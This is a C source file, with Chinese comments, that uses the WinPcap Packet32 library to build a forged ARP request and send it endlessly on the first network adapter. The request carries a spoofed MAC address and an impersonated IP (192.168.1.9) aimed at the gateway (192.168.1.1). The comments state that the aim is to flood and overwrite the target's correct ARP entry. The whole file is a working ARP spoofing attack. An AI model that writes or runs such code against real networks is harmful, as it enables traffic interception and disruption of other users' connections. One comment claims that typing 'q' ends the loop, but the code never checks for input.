#include<stdio.h>

#include<winsock2.h>
#include<packet32.h>
#define EPT_ARP 0x0806                 //定義了一些在封包的head
#define EPT_IP 0x0800
#define ARP_HARDWARE 0X0001
#define ARP_REPLY 0x0002
#define ARP_REQUEST 0x0001

#pragma pack(push,1)                 

typedef struct ethhdr
{
	unsigned char dst[6];        //目地的MAC地址
	unsigned char src[6];        //來源的MAC地址
	unsigned short type;
}ETHHDR, *PETHDHR;

typedef struct eth_arphdr            //乙太網路arp字段長度28
{
	unsigned short arp_hrd;
	unsigned short arp_pro;
	unsigned char   arp_hln;
	unsigned char   arp_pln;
	unsigned short arp_op;

	unsigned char arp_sha[6];    //發送者MAC地址
	unsigned long arp_spa;       //發送者IP
	unsigned char arp_tha[6];    //接收者MAC地址
	unsigned long arp_tpa;       //接收者IP
}ETH_ARPHDR, *PETH_ARPHDR;

typedef struct arp
{
	ETHHDR ethhdr;
	ETH_ARPHDR eth_arp;
}ARP, *PARP;

#pragma pack(pop)

#define Max_Num_Adapter 10

char         AdapterList[Max_Num_Adapter][1024];

int main(int argc, char* argv[])
{
	LPADAPTER   lpAdapter = 0;
	LPPACKET    lpPacket;
	int         i;
	DWORD       dwErrorCode;
	WCHAR      AdapterName[8192];
	WCHAR      *temp, *temp1;
	int      AdapterNum = 0;
	ULONG      AdapterLength;
	ARP arpPacket;
	char szPktBuf[256000];


	printf("%d\n", sizeof(ETHHDR));
	printf("%d\n", sizeof(ETH_ARPHDR));
	printf("%d\n", sizeof(ARP));
	i = 0;
	AdapterLength = sizeof(AdapterName);
	if (PacketGetAdapterNames((char *)AdapterName, &AdapterLength) == FALSE)
	{
		puts("Unable to retrieve the list of the adapters");
		return -1;
	}
	temp = AdapterName;
	temp1 = AdapterName;
	while ((*temp != '\0') || (*(temp - 1) != '\0'))
	{
		if (*temp == '\0')
		{
			memcpy(AdapterList[i], temp1, (temp - temp1) * 2);
			temp1 = temp + 1;
			i++;
		}
		temp++;
	}

	AdapterNum = i;
	for (i = 0; i<AdapterNum; i++){
		wprintf(L"\n%d- %s\n", i + 1, AdapterList[i]);

	}
	// system("pause");
	printf("\n");

	lpAdapter = PacketOpenAdapter(AdapterList[0]);


	if (!lpAdapter || (lpAdapter->hFile == INVALID_HANDLE_VALUE))
	{
		dwErrorCode = GetLastError();
		printf("Unable to open the adapter, Error Code : %lx\n", dwErrorCode);
		return -1;
	}

	lpPacket = PacketAllocatePacket();
	if (lpPacket == NULL)
	{
		printf("alloc lppacket failed");
		return -1;
	}

	ZeroMemory(szPktBuf, sizeof(szPktBuf));                 //封包的清空

	arpPacket.ethhdr.dst[0] = 0xff;                      //開始填充arpPacket
	arpPacket.ethhdr.dst[1] = 0xff;
	arpPacket.ethhdr.dst[2] = 0xff;
	arpPacket.ethhdr.dst[3] = 0xff;
	arpPacket.ethhdr.dst[4] = 0xff;
	arpPacket.ethhdr.dst[5] = 0xff;

	arpPacket.ethhdr.src[0] = 0x00;                      //一樣偽造的MAC地址
	arpPacket.ethhdr.src[1] = 0x20;
	arpPacket.ethhdr.src[2] = 0xce;
	arpPacket.ethhdr.src[3] = 0xa8;
	arpPacket.ethhdr.src[4] = 0x54;
	arpPacket.ethhdr.src[5] = 0x33;

	arpPacket.ethhdr.type = htons(EPT_ARP);
	arpPacket.eth_arp.arp_hrd = htons(ARP_HARDWARE);
	arpPacket.eth_arp.arp_pro = htons(EPT_IP);
	arpPacket.eth_arp.arp_hln = 6;
	arpPacket.eth_arp.arp_pln = 4;
	arpPacket.eth_arp.arp_op = htons(ARP_REQUEST);

	arpPacket.eth_arp.arp_sha[0] = 0x00;                     //仍然是假的MAC地址
	arpPacket.eth_arp.arp_sha[1] = 0x20;
	arpPacket.eth_arp.arp_sha[2] = 0xce;
	arpPacket.eth_arp.arp_sha[3] = 0xa8;
	arpPacket.eth_arp.arp_sha[4] = 0x54;
	arpPacket.eth_arp.arp_sha[5] = 0x33;
	arpPacket.eth_arp.arp_spa = inet_addr("192.168.1.9");    //冒充對象的IP

	arpPacket.eth_arp.arp_tha[0] = 0x00;
	arpPacket.eth_arp.arp_tha[1] = 0x00;
	arpPacket.eth_arp.arp_tha[2] = 0x00;
	arpPacket.eth_arp.arp_tha[3] = 0x00;
	arpPacket.eth_arp.arp_tha[4] = 0x00;
	arpPacket.eth_arp.arp_tha[5] = 0x00;
	arpPacket.eth_arp.arp_tpa = inet_addr("192.168.1.1");    //getway ip
	printf("%d\n", sizeof(arpPacket));
	memcpy(szPktBuf, (char*)&arpPacket, sizeof(arpPacket));
	PacketInitPacket(lpPacket, szPktBuf, 60);
	puts("---------------------------------");
	while (1)                                      //輸入為q時結束 
	{
		puts("-----------------");
		if (PacketSendPacket(lpAdapter, lpPacket, true) == false)   //不斷傳送偽造信息，將目標的正確 arp淹沒                                                              //ARP REQUEST淹?
		{
			printf("error in sending packet");
			return -1;
		}
	}

	printf("send ok");
	PacketFreePacket(lpPacket);         //收尾的工作
	PacketCloseAdapter(lpAdapter);

	return 1;
}
